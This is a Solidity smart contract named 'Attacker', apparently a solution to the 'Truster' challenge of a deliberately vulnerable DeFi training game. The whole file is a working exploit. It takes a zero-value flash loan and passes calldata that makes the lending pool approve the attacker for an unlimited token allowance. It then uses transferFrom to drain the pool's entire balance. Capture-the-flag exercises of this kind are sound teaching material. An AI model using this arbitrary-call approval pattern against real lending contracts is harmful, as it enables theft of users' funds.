// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract Attacker is ReentrancyGuard {
    using Address for address;
    TrusterLenderPool private pool;
    IERC20 public immutable damnValuableToken;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        damnValuableToken = IERC20(_token);
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        pool.flashLoan(0, address(this), address(damnValuableToken), data);
        damnValuableToken.transferFrom(
            address(pool),
            address(this),
            damnValuableToken.balanceOf(address(pool))
        );
    }
}
